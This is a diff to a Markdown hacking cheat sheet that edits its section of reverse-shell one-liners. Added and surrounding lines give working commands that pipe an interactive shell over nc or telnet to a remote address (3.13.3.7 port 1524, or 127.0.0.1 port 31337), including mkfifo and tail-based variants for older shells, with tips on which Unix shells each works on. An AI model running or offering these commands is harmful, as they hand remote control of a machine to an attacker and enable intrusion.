@@ -1172,21 +1172,22 @@ Variant if *'-e'* is not supported:
 { nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
 ```
 
+* On modern shells this can be shortened to `{ nc -v 127.0.0.1 31337 </dev/fd/2|sh;} 2>&1|:`. (*thanks IA_PD*).  
+* The `| :` trick wont work on C-Shell/tcsh (FreeBSD), orignal Bourne shell (Soalris) or Korn shell (AIX). Use `mkfifo` instead.
+
 Variant for older */bin/sh*:
 ```sh
-mkfifo /tmp/.io
-sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
+mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
 ```
 
 Telnet variant:
 ```sh
-mkfifo /tmp/.io
-sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
+mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 ```
 
 Telnet variant when mkfifo is not supported (Ulg!):
 ```sh
-({ touch /tmp/.fio; sleep 60; rm -f /tmp/.fio;} & )
+({ touch /tmp/.fio; sleep 60; rm -f /tmp/.fio;} & );
 tail -f /tmp/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/tmp/.fio
 ```
 Note: This trick logs your commands to a file. The file will be *unlinked* from the after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
